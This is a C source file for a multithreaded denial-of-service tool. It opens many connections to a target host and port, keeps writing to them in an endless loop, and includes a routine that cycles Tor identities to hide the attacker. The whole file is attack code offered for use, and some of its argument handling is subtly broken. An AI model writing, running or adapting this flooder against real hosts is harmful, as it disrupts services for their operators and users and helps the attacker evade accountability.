#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/uio.h>
#include <pthread.h>

/*
 * Function: make_socket
 * ---------------------
 * Creates a socket and establishes a connection to the specified host and port.
 *
 * host: The hostname or IP address of the target.
 * port: The port number of the target.
 *
 * returns: The socket file descriptor if successful, exits the program otherwise.
 */

int make_socket(char *host, char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    int flags;
    fd_set fdset;
    struct timeval tv;

    //fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    // Get address information for the target
    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        exit(0);
    }

    // Iterate through the address list and establish a connection
    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }

    // Check if a connection was established
    if (p == NULL) {
        if (servinfo) {
            freeaddrinfo(servinfo);
        }
        fprintf(stderr, "No connection could be made\n");
        exit(0);
    }

    if (servinfo) {
        freeaddrinfo(servinfo);
    }
    fprintf(stderr, "[Connected -> %s:%s]\n", host, port);

    // Set socket to non-blocking mode
    if ((flags = fcntl(sock, F_GETFL, 0)) == -1) {
        perror("fcntl F_GETFL");
        exit(0);
    }
    if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) == -1) {
        perror("fcntl F_SETFL O_NONBLOCK");
        exit(0);
    }

    // Check if the socket is ready for writing
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    if (select(sock + 1, NULL, &fdset, NULL, &tv) == -1) {
        perror("select");
        exit(0);
    }

    // Check the socket error
    int optval;
    socklen_t optlen = sizeof(optval);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &optval, &optlen) == -1) {
        perror("getsockopt");
        exit(0);
    }
    if (optval != 0) {
        fprintf(stderr, "Connection error: %s\n", strerror(optval));
        exit(0);
    }

    // Set socket back to blocking mode
    if (fcntl(sock, F_SETFL, flags) == -1) {
        perror("fcntl F_SETFL");
        exit(0);
    }

    return sock;
}

void broke(int s) {
    // do nothing
}

#define CONNECTIONS 8
#define THREADS 48

/*
 * Function: attack
 * ----------------
 * Initiates an attack by creating multiple sockets and continuously sending data to the target host and port.
 *
 * host: The hostname or IP address of the target.
 * port: The port number of the target.
 * id:   The identifier of the attack thread.
 */

void attack(char *host, char *port, int id) {
    int sockets[CONNECTIONS];
    int x, r;
    int readySockets = 0;

    // Create initial sockets
    for (x = 0; x < CONNECTIONS; x++) {
        sockets[x] = make_socket(host, port);
        if (sockets[x] > 0) {
            readySockets++;
        }
    }

    // Set signal handler for SIGPIPE
    signal(SIGPIPE, &broke);

    while (1) {
	// Check and recreate closed sockets
        for (x = 0; x < CONNECTIONS; x++) {
            if (sockets[x] == -1) {
                sockets[x] = make_socket(host, port);
                if (sockets[x] > 0) {
                    readySockets++;
                }
            } else {
		// Send data to the socket
                r = write(sockets[x], "\0", 1);
                if (r == -1) {
                    if (errno == EPIPE || errno == ECONNRESET) {
                        close(sockets[x]);
                        sockets[x] = make_socket(host, port);
                        if (sockets[x] > 0) {
                            readySockets++;
                        }
                    }
                } else {
                    // fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
                    fprintf(stderr, "[%i: Voly Sent]\n", id);
                }
            }
        }

        // Check if all sockets are ready
        if (readySockets < CONNECTIONS) {
            for (x = 0; x < CONNECTIONS; x++) {
                if (sockets[x] > 0) {
                    fd_set writeSet;
                    FD_ZERO(&writeSet);
                    FD_SET(sockets[x], &writeSet);

                    struct timeval tv;
                    tv.tv_sec = 0;
                    tv.tv_usec = 0;

                    if (select(sockets[x] + 1, NULL, &writeSet, NULL, &tv) == -1) {
                        perror("select");
                        exit(0);
                    }

                    if (FD_ISSET(sockets[x], &writeSet)) {
                        readySockets++;
                    }
                }
            }
        }

        fprintf(stderr, "[%i: Data Packages Sent]\n", id);
        usleep(300000); // Sleep for 300 milliseconds
    }
}

/*
 * Function: cycle_identity
 * ------------------------
 * Cycles the Tor identity by sending a series of commands to the Tor control port.
 * It sends an AUTHENTICATE command followed by a signal NEWNYM command in a loop.
 * This function assumes that there is a Tor instance running on localhost:9050.
 */

void cycle_identity() {
    int r;
    int sock = make_socket("localhost", "9050");
    write(sock, "AUTHENTICATE \"\"\n", 16);

    struct iovec iov[2];
    char signalCmd[] = "signal NEWNYM\n\x00";
    iov[0].iov_base = signalCmd;
    iov[0].iov_len = strlen(signalCmd);

    while (1) {
        iov[1].iov_base = signalCmd;
        iov[1].iov_len = strlen(signalCmd);

        r = writev(sock, iov, 2);
        fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
        usleep(300000); // Sleep for 300 milliseconds
    }
}

/*
 * Function: thread_function
 * -------------------------
 * Entry point for the thread execution. It is called when a new thread is created.
 * It receives a void pointer as an argument and performs an attack by calling the
 * `attack` function with the provided host, port, and thread ID.
 *
 * arg: A void pointer to the arguments passed to the thread. It is expected to be
 *      an integer array containing the thread ID at index 0, host at index 1,
 *      and port at index 2.
 *
 * Returns: Always returns NULL.
 */

void* thread_function(void* arg) {
    int id = *(int*)arg;
    char** args = (char**)arg;
    attack(args[0], args[1], id);
    return NULL;
}

int main(int argc, char** argv) {
    int x;
    if (argc != 3)
        cycle_identity();

    pthread_t threads[THREADS];
    int thread_ids[THREADS];

    for (x = 0; x < THREADS; x++) {
    thread_ids[x] = x;
    char* arguments[2];
    arguments[0] = argv[1];
    arguments[1] = argv[2];
    pthread_create(&threads[x], NULL, thread_function, arguments);
    usleep(200000);
    }   

    fd_set stdin_fds;
    FD_ZERO(&stdin_fds);
    FD_SET(STDIN_FILENO, &stdin_fds);

    while (select(STDIN_FILENO + 1, &stdin_fds, NULL, NULL, NULL) > 0) {
        if (FD_ISSET(STDIN_FILENO, &stdin_fds)) {
            // Input received from stdin
            break;
        }
    }

    for (x = 0; x < THREADS; x++) {
        pthread_cancel(threads[x]);
    }

    return 0;
}
